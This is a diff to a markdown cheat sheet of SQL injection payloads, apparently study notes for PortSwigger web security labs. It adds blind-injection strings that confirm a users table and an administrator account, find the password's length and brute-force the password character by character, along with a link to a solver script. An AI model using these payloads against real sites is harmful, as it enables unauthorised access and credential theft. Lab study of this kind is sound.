@@ -39,9 +39,17 @@ UNION SELECT 1, 'JqsAUV', 1 FROM information_schema.schemata -- - if give string
 -- retrieving data from other tables
 UNION SELECT username, password FROM users -- -
 -- retrieving multiple values in a single column
-UNION SELECT 1, CONCAT(username, password) FROM users -- -
+UNION SELECT 1, CONCAT(username, password) FROM users -- - 
 -- Blind SQL injection with conditional responses
+AND (SELECT 'x' FROM information_schema.tables WHERE table_name='users')='x' -- - verify if table exists
+AND (SELECT 'x' FROM users WHERE username='administrator')='x' -- - confirm if user exists
+AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 -- - get password's length
+AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='8' -- - bruteforce password char by char
+-- Blind SQL injection with conditional errors
+OR 1=(SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator')) = 20 THEN TO_CHAR(1/0) ELSE '1' END FROM dual) -- - get password's length
 ```
+
+- Solver for Blind SQL injection with conditional responses can be found [here](/assets/solutions/portswigger/conditional_responses.py).
 
 ## Cross-site Scripting (XSS)
 ### Cheat Sheet
